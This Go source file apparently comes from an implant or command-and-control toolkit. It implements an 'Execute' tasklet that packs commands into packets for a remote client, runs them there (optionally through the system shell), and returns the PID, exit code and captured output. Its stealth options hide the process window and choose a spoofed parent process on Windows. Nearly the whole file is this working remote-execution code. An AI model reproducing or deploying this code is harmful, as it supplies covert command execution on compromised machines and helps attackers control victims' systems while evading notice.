package task

import (
	"bytes"
	"context"
	"io"
	"io/ioutil"
	"strings"
	"time"
	"unsafe"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
)

// Execute represents the execute Tasklet. This can be used to instruct a client to
// execute a specific command.
const Execute = exec(0xC3)

type exec uint8

// Process is a struct that is similar to the 'cmd.Process' struct. This is used to Task a Client with running
// a specified command. These can be submitted to the Execute tasklet.
type Process struct {
	Filter *cmd.Filter
	Dir    string

	Env, Args []string
	Stdin     []byte

	Timeout time.Duration
	Flags   uint32
	Wait    bool
	Hide    bool
}

func (exec) Thread() bool {
	return true
}

// SetFlags will set the startup Flag values used for Windows programs. This function overrites many
// of the 'Set*' functions. Has no effect if the device is not running Windows.
func (p *Process) SetFlags(f uint32) {
	p.Flags = f
}
func (exec) Exec(c string) *com.Packet {
	return Execute.Run(&Process{Args: cmd.Split(c), Wait: true})
}
func (exec) Run(p *Process) *com.Packet {
	v := &com.Packet{ID: TvExecute}
	p.MarshalStream(v)
	return v
}
func (exec) Shell(c string) *com.Packet {
	return Execute.Run(&Process{Args: []string{"@SHELL@", c}, Wait: true})
}
func (exec) Raw(c ...string) *com.Packet {
	return Execute.Run(&Process{Args: c, Wait: true})
}

// SetParent will instruct the Process to choose a parent with the supplied process Filter. If the Filter is nil
// this will use the current process (default). This function has no effect if the device is not running Windows.
// Setting the Parent process will automatically set 'SetNewConsole' to true.
func (p *Process) SetParent(f *cmd.Filter) {
	p.Filter = f
}
func (exec) PowerShell(c string) *com.Packet {
	return nil
}

// SetStdin wil attempt to read all the data from the supplied reader to fill the Stdin byte array for this Process
// struct. This function will return an error if any occurs during reading.
func (p *Process) SetStdin(r io.Reader) error {
	var err error
	p.Stdin, err = ioutil.ReadAll(r)
	return err
}

// MarshalStream writes the data for this Process to the supplied Writer.
func (p Process) MarshalStream(w data.Writer) error {
	if err := data.WriteStringList(w, p.Args); err != nil {
		return err
	}
	if err := w.WriteString(p.Dir); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Env); err != nil {
		return err
	}
	if err := w.WriteBool(p.Wait); err != nil {
		return err
	}
	if err := w.WriteUint32(p.Flags); err != nil {
		return err
	}
	if err := w.WriteUint64(uint64(p.Timeout)); err != nil {
		return err
	}
	if err := w.WriteBool(p.Hide); err != nil {
		return err
	}
	if err := w.WriteBool(p.Filter != nil); err != nil {
		return err
	}
	if p.Filter != nil {
		if err := p.Filter.MarshalStream(w); err != nil {
			return err
		}
	}
	if err := w.WriteBytes(p.Stdin); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Process from the supplied Reader.
func (p *Process) UnmarshalStream(r data.Reader) error {
	if err := data.ReadStringList(r, &p.Args); err != nil {
		return err
	}
	if err := r.ReadString(&p.Dir); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &p.Env); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Wait); err != nil {
		return err
	}
	if err := r.ReadUint32(&p.Flags); err != nil {
		return err
	}
	if err := r.ReadUint64((*uint64)(unsafe.Pointer(&p.Timeout))); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Hide); err != nil {
		return err
	}
	f, err := r.Bool()
	if err != nil {
		return err
	}
	if f {
		p.Filter = new(cmd.Filter)
		if err = p.Filter.UnmarshalStream(r); err != nil {
			return err
		}
	}
	if p.Stdin, err = r.Bytes(); err != nil {
		return err
	}
	return nil
}
func (exec) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
	var e Process
	if err := e.UnmarshalStream(p); err != nil {
		return nil, err
	}
	if len(e.Args) == 0 {
		return nil, cmd.ErrEmptyCommand
	}
	var (
		z = cmd.NewProcessContext(x, e.Args...)
		o bytes.Buffer
	)
	if e.Args[0] == "@SHELL@" {
		z.Args = []string{device.Shell}
		z.Args = append(z.Args, device.ShellArgs...)
		z.Args = append(z.Args, strings.Join(e.Args[1:], " "))
	}
	if z.SetFlags(e.Flags); e.Hide {
		z.SetWindowDisplay(0)
	}
	if z.SetParent(e.Filter); len(e.Stdin) > 0 {
		z.Stdin = bytes.NewReader(e.Stdin)
	}
	if z.Timeout, z.Dir, z.Env = e.Timeout, e.Dir, e.Env; e.Wait {
		z.Stdout = &o
		z.Stderr = &o
	}
	if err := z.Start(); err != nil {
		return nil, err
	}
	e.Stdin = nil
	w := new(com.Packet)
	if w.WriteUint64(z.Pid()); !e.Wait {
		w.WriteInt32(0)
		return w, nil
	}
	err := z.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		w.Clear()
		return nil, err
	}
	c, _ := z.ExitCode()
	w.WriteInt32(c)
	io.Copy(w, &o)
	return w, nil
}
